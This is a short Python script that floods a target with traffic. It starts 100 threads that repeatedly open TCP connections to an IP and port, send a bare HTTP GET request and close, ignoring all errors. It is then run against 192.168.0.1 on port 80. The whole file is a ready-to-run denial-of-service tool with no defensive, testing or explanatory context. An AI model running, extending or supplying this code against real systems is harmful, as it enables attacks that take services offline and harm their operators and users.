import socket
import threading

def flood(ip, port):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                s.close()
            except:
                pass
    for _ in range(100):
        threading.Thread(target=attack, daemon=True).start()

flood("192.168.0.1", 80)
